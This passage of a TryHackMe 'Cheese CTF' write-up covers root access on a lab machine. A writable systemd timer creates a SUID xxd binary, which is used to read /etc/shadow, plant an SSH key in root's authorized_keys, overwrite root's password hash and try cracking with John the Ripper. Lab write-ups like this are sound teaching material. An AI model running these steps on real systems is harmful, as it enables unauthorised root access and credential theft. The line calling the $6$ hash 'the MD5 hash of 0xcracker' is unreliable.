⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⣼⠟⠛⢿⡆⠀⠀⠀⠀⠀⣀⣤⣶⡿⠟⢿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠋⠀⠀⣴⡿⠛⠛⠛⠛⣿⡄⠀⠀⠀⠀⠻⣶⣶⣾⠇⢀⣀⣤⣶⠿⠛⠉⠀⠀⠀⢸⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⢿⣦⡀⠀⠀⠀⣹⡇⠀⠀⠀⠀⠀⣀⣤⣶⡾⠟⠋⠁⠀⠀⠀⠀⠀⣠⣴⠾⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠙⠻⠿⠶⠾⠟⠁⢀⣀⣤⡶⠿⠛⠉⠀⣠⣶⠿⠟⠿⣶⡄⠀⠀⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⢁⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠾⠟⠋⠁⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⣼⡇⠀⠀⠙⢷⣤⡀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⣾⡏⢻⣷⠀⠀⠀⢀⣠⣴⡶⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⣤⣤⣴⡟⠀⠀⠀⠀⠀⢻⡇
⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠙⠛⢛⣋⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⠀⠀⣠⣾⠟⠁⠀⢀⣀⣤⣤⡶⠾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⣠⣾⣿⣥⣶⠾⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠶⣶⣤⣀⠀⠀⠀⠀⠀⢠⡿⠋⠁⠀⠀⠀⠈⠉⢻⣆⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠛⠉⠁⠀⢀⣠⣴⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠋⠀⠀⠀⠉⠻⣷⡀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠀⠀⠀⣴⡟⠋⠀⠀⠈⢻⣦⠀⠀⠀⠀⠀⢰⣿⠁⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⢿⡆⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠙⢿⣦⣄⣀⣀⣠⣤⡾⠋⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⠘⣿⣄⣀⣠⣴⡿⠁⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⣀⣤⣴⠿⠃
⠀⠸⣷⡄⠀⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⡶⠟⠋⠉⠀⠀⠀
⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢨⣿⠀⠀⠀⠀⠀⠀⣼⡟⠁⠀⠀⠀⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣤⣤⣤⣴⡿⠃⠀⠀⣀⣤⣶⠾⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⣀⣠⣴⡾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⡇⠀⠀⠀⠀⣀⣤⣴⠾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢻⣧⣤⣴⠾⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


THM{9f2ce3df1beeecaf
```

## Shell as root
We can read the root flag directly if you want to remain just a script kiddie, not a professional hacker.

<div class="gif-container">
<img src="https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExMnFocmR0OGNuY3QzNHM3M2xtbDN6c2xzdW0zOTA0djRzMnFqYWwyOCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/r1wGrCEZ4zTeU/giphy.gif" alt="GIF" class="gif-responsive">
</div>


```sh
comte@cheesectf:~$ LFILE=/root/root.txt
comte@cheesectf:~$ cd /opt
comte@cheesectf:/opt$ ./xxd "$LFILE" | xxd -r
      _                           _       _ _  __
  ___| |__   ___  ___  ___  ___  (_)___  | (_)/ _| ___
 / __| '_ \ / _ \/ _ \/ __|/ _ \ | / __| | | | |_ / _ \
| (__| | | |  __/  __/\__ \  __/ | \__ \ | | |  _|  __/
 \___|_| |_|\___|\___||___/\___| |_|___/ |_|_|_|  \___|


THM{dca7548609481080
```

> Privilege Escalation via `systemd Timer` and `Service Manipulation`
{: .prompt-info }

Context of steps :

User comte has the ability to run `systemctl` commands without a password (NOPASSWD), specifically for managing the `exploit.timer` and `daemon-reload`.

The `exploit.service` file contains a one-shot service that runs a command to copy `/usr/bin/xxd` to `/opt/xxd` and set the `SUID bit `on it (`chmod +sx`).

The `exploit.timer` file lacks a configured time for when it should run, which suggests it needs to be manually triggered.


**as you see those files `no need to passwd` instead of that we can use `sudo` just.**

```sh
comte@cheesectf:~$ sudo -l
User comte may run the following commands on cheesectf:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```

```sh
comte@cheesectf:~$ ls -lna /etc/systemd/system/exploit.timer
-rwxrwxrwx 1 0 0 87 Mar 29  2024 /etc/systemd/system/exploit.timer
```
**Now as we known from previous enumeration that the Exploit.timer file is writable, let's take a look at it.**

> Notice that you should consider whether you should use sudo or not, based on the permissions granted to each file.
{: .prompt-warning }

```sh
comte@cheesectf:~$ cat /etc/systemd/system/exploit.timer
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=

[Install]
WantedBy=timers.target
```

**explore this service.**
```sh
comte@cheesectf:~$ cat /etc/systemd/system/exploit.service
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
```

```sh
comte@cheesectf:~$ systemctl status exploit.timer

Failed to start exploit.timer: Unit exploit.timer has a bad unit file setting.
See system logs and 'systemctl status exploit.timer' for details.
comte@cheesectf:~$ systemctl status exploit.timer
● exploit.timer - Exploit Timer
     Loaded: bad-setting (Reason: Unit exploit.timer has a bad unit file setting.)
     Active: inactive (dead)
    Trigger: n/a
   Triggers: ● exploit.service
```
**as you see `bad-setting` because wrong in `Timer` so must assign value to `OnBootSec=`**

```sh
nano /etc/systemd/system/exploit.timer

[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=0

[Install]
WantedBy=timers.target
```

**Then reload the trigger(launcher) manually.**

```sh
sudo /bin/systemctl daemon-reload
```

**Activation a service.**
```sh
sudo systemctl start exploit.timer
```

**now is active**
```sh
comte@cheesectf:~$ systemctl status exploit.timer

● exploit.timer - Exploit Timer
     Loaded: loaded (/etc/systemd/system/exploit.timer; disabled; vendor preset: enabled)
     Active: active (elapsed) since Tue 2024-10-01 15:47:25 UTC; 28min ago
    Trigger: n/a
   Triggers: ● exploit.service
```

**finally we have file `xxd` added as `SUID bit` file.**
```sh
comte@cheesectf:~$ ls -la /opt
total 28
drwxr-xr-x  2 root root  4096 Oct  1 15:47 .
drwxr-xr-x 19 root root  4096 Sep 27  2023 ..
-rwsr-sr-x  1 root root 18712 Oct  1 15:47 xxd
```

Checking into <a href="https://gtfobins.github.io/gtfobins/xxd/" target="_blank">XXD | GTFObins</a> for the `xxd` binary, we see that it can be used for `writing to files`.

____________________________________________________________________________________

**Now we can take advantage of this by two methods.**

#### **option | `/root/.ssh/authorized_keys`**

```sh
comte@cheesectf:~$ echo "ssh-rsa AAAAB3NzaC1y......" | xxd | /opt/xxd -r - /root/.ssh/authorized_keys
```

```sh
┌──(cracker㉿carcker)-[~/Desktop/THM/Cheese-CTF]
└─$ ssh -i cheese_rsa root@10.10.202.162

root@cheesectf:~# id
uid=0(root) gid=0(root) groups=0(root)
```


#### **option || Modifying `/etc/passwd` to Set a Root Password**

Summary :
This method exploits the ability to edit the `/etc/shadow` file by replacing the hashed password for the `root` account. By generating a new password hash with `OpenSSL` and then modifying the shadow file using `xxd`, we can gain root access with a known password (`0xcracker`).

**Step 1 :** Generating a Hashed Password

First, we generate a hashed version of the desired password using OpenSSL. In this case, we use `0xcracker` as the password:

```sh
omte@cheesectf:~$ openssl passwd -1 0xcracker
$1$klHBDaJf$wPfrs4ctpAFfFTdV7bB/B1
```

> This command generates an MD5-based hash (`-1` flag) that is compatible with `/etc/shadow`, where passwords are stored as hashes instead of plaintext.
{: .prompt-info}

**Step 2 :** Reading the `/etc/shadow` File Using `xxd`

> Next, we read the contents of the /etc/shadow file using the xxd command, a tool that can dump a file in hexadecimal and reverse it back to its original format:
{: .prompt-tip }

```sh
comte@cheesectf:~$ sudo xxd "$LFILE" | xxd -r
```

```sh
comte@cheesectf:/opt$ ./xxd "$LFILE" | xxd -r
root:$6$DwLLYKg9WAawlN1G$OAzr1yOwosOm0GaIRZZWWoIvo170oJKyvm7jjraZuXbrrfG06OImlE3EieXBCfqf8W.pUAjQevUgbdUqVykQo.:19627:0:99999:7:::                                                           
daemon:*:19430:0:99999:7:::                                                                                                                                                                  
bin:*:19430:0:99999:7:::                                                                                                                                                                     
sys:*:19430:0:99999:7:::                                                                                                                                                                     
sync:*:19430:0:99999:7:::                                                                                                                                                                    
games:*:19430:0:99999:7:::                                                                                                                                                                   
man:*:19430:0:99999:7:::                                                                                                                                                                     
lp:*:19430:0:99999:7:::                                                                                                                                                                      
mail:*:19430:0:99999:7:::                                                                                                                                                                    
news:*:19430:0:99999:7:::                                                                                                                                                                    
uucp:*:19430:0:99999:7:::                                                                                                                                                                    
proxy:*:19430:0:99999:7:::                                                                                                                                                                   
www-data:*:19430:0:99999:7:::                                                                                                                                                                
backup:*:19430:0:99999:7:::
list:*:19430:0:99999:7:::
irc:*:19430:0:99999:7:::
gnats:*:19430:0:99999:7:::
nobody:*:19430:0:99999:7:::
systemd-network:*:19430:0:99999:7:::
systemd-resolve:*:19430:0:99999:7:::
systemd-timesync:*:19430:0:99999:7:::
messagebus:*:19430:0:99999:7:::
syslog:*:19430:0:99999:7:::
_apt:*:19430:0:99999:7:::
tss:*:19430:0:99999:7:::
uuidd:*:19430:0:99999:7:::
tcpdump:*:19430:0:99999:7:::
landscape:*:19430:0:99999:7:::
pollinate:*:19430:0:99999:7:::
fwupd-refresh:*:19430:0:99999:7:::
usbmux:*:19627:0:99999:7:::
sshd:*:19627:0:99999:7:::
systemd-coredump:!!:19627::::::
comte:$6$Ady72kRdzcA5YzaW$CUSQWFSxL3yilaDBPUCbK8ee0MU1JRvSoodgHgwqPrMXFKeAWpX5KasV3XBmy4QHsQ7KTx.8J2VeXP2j4UDVu1:19627:0:99999:7:::
lxd:!:19627::::::
mysql:!:19627:0:99999:7:::
```
**This step ensures we have the correct format of the file to edit.**

**Step 3 :** Crafting the Modified Entry

> We take the hashed password generated earlier and craft a new string to replace the root user's password in `/etc/shadow`. The format follows this structure:

{: .prompt-info}
```console
username:$hash:lastchanged:min:max:warn:inactive:expire:reserved
```
the `original /etc/shadow` :

```sh
root:$6$DwLLYKg9WAawlN1G$OAzr1yOwosOm0GaIRZZWWoIvo170oJKyvm7jjraZuXbrrfG06OImlE3EieXBCfqf8W.pUAjQevUgbdUqVykQo.:19627:0:99999:7:::
```
- `root` is the username.
- `$6$DwLLYKg9WAawlN1G$OAzr1yOwosOm0GaIRZZWWoIvo170oJKyvm7jjraZuXbrrfG06OImlE3EieXBCfqf8W.pUAjQevUgbdUqVykQo.` is the MD5 hash of `0xcracker`
- The remaining numbers represent password aging information.

**Step 4 :** Writing the Modified Hash to /etc/shadow
Using xxd again, we can overwrite the original root entry in /etc/shadow with our crafted hash. This is done with the following command:

```sh
comte@cheesectf:/opt$ echo 'root:$1$klHBDaJf$wPfrs4ctpAFfFTdV7bB/B1:19627:0:99999:7:::' | /opt/xxd | /opt/xxd -r - "$LFILE"
```
**Step 5 :** Verifying the Changes

again 😒

```sh
comte@cheesectf:/opt$ ./xxd "$LFILE" | xxd -r
root:$1$klHBDaJf$wPfrs4ctpAFfFTdV7bB/B1:19627:0:99999:7:::
```

**Step 6 :** Switching to Root
Now that the root password is updated, we can switch to the root user with the new password (`0xcracker`):

```sh
comte@cheesectf:/opt$ su root
Password: 
root@cheesectf:/opt# id
uid=0(root) gid=0(root) groups=0(root)
```
#### **option ||| using unshadow**
I tried that, but somehow it failed.

You can check <a href="https://www.hackingarticles.in/linux-for-pentester-xxd-privilege-escalation/#:~:text=In%20this%20article,%20we%20are%20going%20to%20make%20our%20readers" target="_blank">here</a> for a deeper understanding.

The `unshadow` function combines the information from the `/etc/passwd` and `/etc/shadow` files, which is essential for cracking password hashes using tools like `John the Ripper`.


Reading file /etc/passwd
```sh
comte@cheesectf:~$ LFILE=/etc/passwd
comte@cheesectf:~$ /opt/xxd "$LFILE" | /opt/xxd -r
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
comte:x:1000:1000:comte:/home/comte:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
```

Reading file /etc/shadow
```sh
comte@cheesectf:~$ LFILE=/etc/shadow
com
te@cheesectf:~$ /opt/xxd "$LFILE" | /opt/xxd -r
root:$6$DwLLYKg9WAawlN1G$OAzr1yOwosOm0GaIRZZWWoIvo170oJKyvm7jjraZuXbrrfG06OImlE3EieXBCfqf8W.pUAjQevUgbdUqVykQo.:19627:0:99999:7:::
daemon:*:19430:0:99999:7:::
bin:*:19430:0:99999:7:::
sys:*:19430:0:99999:7:::
sync:*:19430:0:99999:7:::
games:*:19430:0:99999:7:::
man:*:19430:0:99999:7:::
lp:*:19430:0:99999:7:::
mail:*:19430:0:99999:7:::
news:*:19430:0:99999:7:::
uucp:*:19430:0:99999:7:::
proxy:*:19430:0:99999:7:::
www-data:*:19430:0:99999:7:::
backup:*:19430:0:99999:7:::
list:*:19430:0:99999:7:::
irc:*:19430:0:99999:7:::
gnats:*:19430:0:99999:7:::
nobody:*:19430:0:99999:7:::
systemd-network:*:19430:0:99999:7:::
systemd-resolve:*:19430:0:99999:7:::
systemd-timesync:*:19430:0:99999:7:::
messagebus:*:19430:0:99999:7:::
syslog:*:19430:0:99999:7:::
_apt:*:19430:0:99999:7:::
tss:*:19430:0:99999:7:::
uuidd:*:19430:0:99999:7:::
tcpdump:*:19430:0:99999:7:::
landscape:*:19430:0:99999:7:::
pollinate:*:19430:0:99999:7:::
fwupd-refresh:*:19430:0:99999:7:::
usbmux:*:19627:0:99999:7:::
sshd:*:19627:0:99999:7:::
systemd-coredump:!!:19627::::::
comte:$6$Ady72kRdzcA5YzaW$CUSQWFSxL3yilaDBPUCbK8ee0MU1JRvSoodgHgwqPrMXFKeAWpX5KasV3XBmy4QHsQ7KTx.8J2VeXP2j4UDVu1:19627:0:99999:7:::
lxd:!:19627::::::
mysql:!:19627:0:99999:7:::
```

Then copy each one to a file.
```sh
┌──(cracker㉿carcker)-[~/Desktop/THM/Cheese-CTF]
└─$ vi passwd                       
                                                                                                                                                                                             
┌──(cracker㉿carcker)-[~/Desktop/THM/Cheese-CTF]
└─$ vi shadow
```

**Purpose of `unshadow`:**

The `unshadow` command merges the `/etc/passwd` and `/etc/shadow` files into a single file that contains the required user information along with the corresponding password hashes.

This is necessary because password cracking tools like **John the Ripper** need both the **username** from `/etc/passwd` and the **hashes** from `/etc/shadow` in a combined format.

```sh
┌──(cracker㉿carcker)-[~/Desktop/THM/Cheese-CTF]
└─$ unshadow passwd shadow > hash_unshadow_passwd_and_shadow
```

Finally Cracking the Hash:, but unfortunately this method did not work in our case.
```sh
┌──(cracker㉿carcker)-[~/Desktop/THM/Cheese-CTF]
└─$ john hash_unshadow_passwd_and_shadow -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:31 0.12% (ETA: 02:47:05) 0g/s 654.5p/s 1309c/s 1309C/s michael!..september7
0g 0:00:00:35 0.14% (ETA: 02:50:13) 0g/s 652.8p/s 1320c/s 1320C/s ceaser..teamoa
0g 0:00:00:41 0.16% (ETA: 02:49:34) 0g/s 657.8p/s 1328c/s 1328C/s 071184..010293
0g 0:00:03:32 1.00% (ETA: 01:36:10) 0g/s 796.1p/s 1594c/s 1594C/s millie23..machines1
0g 0:00:08:48 2.48% (ETA: 01:36:58) 0g/s 782.0p/s 1564c/s 1564C/s janilson..ja1991
```
![](/images/TryHackMe/Cheese/Congratulations.png)

---

<style>
img {
  transition: all 0.3s ease;
}

img:hover {
  transform: scale(1.05);
  filter: brightness(90%);
  box-shadow: 0 15px 35px rgba(0, 0, 0, 0);
}

img:center {
  display: block;
  margin-left: auto;
  margin-right: auto;
}

.wrap pre {
  white-space: pre-wrap;
}

.gif-container {
    text-align: center;
    margin: 30px 0;
}

.gif-responsive {
    width: 100%;
    max-width: 800px;
    height: 450px;
    border-radius: 12px;
    object-fit: cover;
    box-shadow: 0 10px 25px rgba(0, 0, 0, 0);
    transition: transform 0.3s ease, box-shadow 0.3s ease;
}

.gif-responsive:hover {
    transform: scale(1.02);
    box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
}

/* Additional video styles */
.video-container {
  text-align: center;
  margin: 30px auto;        /* centers inside post */
  max-width: 800px;         /* keeps container from being huge */
}

.video-responsive {
  width: 100%;              /* fill container */
  aspect-ratio: 16 / 9;    /* keeps correct proportions on desktop */
  border-radius: 12px;
  object-fit: cover;
  box-shadow: 0 10px 25px rgba(0.1, 0.1, 0, 0.1);
  transition: transform 0.3s ease, box-shadow 0.3s ease;
}

.video-responsive:hover {
  transform: scale(1.02);
  box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
}

/* Mobile Responsive Styles */
@media screen and (max-width: 768px) {
    .gif-responsive {
    width: 100% !important;
    max-width: 100% !important;
    height: auto !important;
  }

  .video-responsive {
    width: 100% !important;
    max-width: 100% !important;
    aspect-ratio: auto;  /* let phone use natural aspect ratio */
    height: auto !important;
  }
  
  .box-button {
    max-width: 100% !important;
    width: 100% !important;
    padding: 10px 14px !important;
    justify-content: center !important;
    gap: 6px !important;
    position: relative;
  }
  /* Hide desktop text on mobile */
  .box-button span {
    display: none !important;
  }

  /* Show mobile text from data attribute */
  .box-button::after {
    content: attr(data-mobile-text) !important;
    font-size: 10px !important;
    text-align: center !important;
    white-space: nowrap !important;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif !important;
    font-weight: 1000 !important;
  }

      /* DEFAULT: Use #a1a1a1 for most buttons */
    .box-button::after {
      color: #a1a1a1 !important;
    }

    /* Specific color overrides for each button style */
    
    /* CYBER BLUE NEON - Blue text */
    .box-button[style*="color: #00ccff"]::after,
    .box-button[style*="color:#00ccff"]::after {
      color: #00ccff !important;
    }

    /* HACKER GREEN TERMINAL - Green text */
    .box-button[style*="color: #00ff88"]::after,
    .box-button[style*="color:#00ff88"]::after {
      color: #00ff88 !important;
    }

    /* PURPLE NEON LIGHT - Purple text */
    .box-button[style*="color: #cc00ff"]::after,
    .box-button[style*="color:#cc00ff"]::after {
      color: #cc00ff !important;
    }

    /* RED ALERT GLOW - Red text (#ff4444) */
    .box-button[style*="color: #ff4444"]::after,
    .box-button[style*="color:#ff4444"]::after,
    .box-button[style*="color: #ff5555"]::after,
    .box-button[style*="color:#ff5555"]::after {
      color: #ff4444 !important;
    }

    /* ORANGE SUNLIGHT - Orange text */
    .box-button[style*="color: #ffaa00"]::after,
    .box-button[style*="color:#ffaa00"]::after {
      color: #ffaa00 !important;
    }

    /* MINIMAL LIGHT SHINE - Dark text for light background */
    .box-button[style*="background: #ffffff"]::after,
    .box-button[style*="background:#ffffff"]::after,
    .box-button[style*="color: #333333"]::after,
    .box-button[style*="color:#333333"]::after {
      color: #333333 !important;
    }

    /* TEAL CYBER GLOW - Teal text */
    .box-button[style*="color: #5eead4"]::after,
    .box-button[style*="color:#5eead4"]::after {
      color: #5eead4 !important;
    }

    /* PINK NEON LIGHT - Pink text */
    .box-button[style*="color: #f9a8d4"]::after,
    .box-button[style*="color:#f9a8d4"]::after {
      color: #f9a8d4 !important;
    }

    /* FOREST GREEN LIGHT - Lime text */
    .box-button[style*="color: #bef264"]::after,
    .box-button[style*="color:#bef264"]::after {
      color: #bef264 !important;
    }

    /* DARK RED WINE GLOW - Light red text */
    .box-button[style*="color: #fecaca"]::after,
    .box-button[style*="color:#fecaca"]::after {
      color: #fecaca !important;
    }

    /* LIGHT BLUE SKY SHINE - Blue text */
    .box-button[style*="color: #1e40af"]::after,
    .box-button[style*="color:#1e40af"]::after {
      color: #1e40af !important;
    }

    /* DARK ORANGE GLOW - Orange text */
    .box-button[style*="color: #fdba74"]::after,
    .box-button[style*="color:#fdba74"]::after {
      color: #fdba74 !important;
    }

    /* CYBER YELLOW - Yellow text */
    .box-button[style*="color: #fef08a"]::after,
    .box-button[style*="color:#fef08a"]::after {
      color: #fef08a !important;
    }

    /* DEEP SPACE - Purple text */
    .box-button[style*="color: #9370db"]::after,
    .box-button[style*="color:#9370db"]::after {
      color: #9370db !important;
    }

    /* ELECTRIC PINK - Pink text */
    .box-button[style*="color: #e879f9"]::after,
    .box-button[style*="color:#e879f9"]::after {
      color: #e879f9 !important;
    }

    /* LAVA RED - Light red text */
    .box-button[style*="color: #fca5a5"]::after,
    .box-button[style*="color:#fca5a5"]::after {
      color: #fca5a5 !important;
    }

    /* AQUA MARINE - Teal text */
    .box-button[style*="color: #99f6e4"]::after,
    .box-button[style*="color:#99f6e4"]::after {
      color: #99f6e4 !important;
    }

    /* ROYAL PURPLE - Light purple text */
    .box-button[style*="color: #d8b4fe"]::after,
    .box-button[style*="color:#d8b4fe"]::after {
      color: #d8b4fe !important;
    }

    /* EMERALD GREEN - Green text */
    .box-button[style*="color: #6ee7b7"]::after,
    .box-button[style*="color:#6ee7b7"]::after {
      color: #6ee7b7 !important;
    }

    /* MIDNIGHT BLUE - Light blue text */
    .box-button[style*="color: #93c5fd"]::after,
    .box-button[style*="color:#93c5fd"]::after {
      color: #93c5fd !important;
    }

    /* Light backgrounds with colored text - use original colors */
    .box-button[style*="background: linear-gradient(135deg, #fef3c7"]::after,
    .box-button[style*="background: linear-gradient(135deg, #fde68a"]::after,
    .box-button[style*="background: linear-gradient(135deg, #f8fafc"]::after,
    .box-button[style*="background: linear-gradient(135deg, #dbeafe"]::after,
    .box-button[style*="background: linear-gradient(135deg, #bfdbfe"]::after {
      color: #333333 !important; /* Dark text for better contrast on light backgrounds */
    }

  .box-button img {
    width: 28px !important;
    height: 28px !important;
    margin-right: 0 !important;
  }
}
/* Desktop Styles */
@media screen and (min-width: 769px) {
  .box-button::after {
    display: none !important;
  }
  
  .box-button span {
    display: inline !important;
  }
}
</style>
<script>
// Function to make only .redirect class links open in new tabs, but not work here actually i don'know why
document.querySelectorAll('a.redirect').forEach(link => {
    link.setAttribute('target', '_blank');
    link.setAttribute('rel', 'noopener noreferrer');
});
</script>
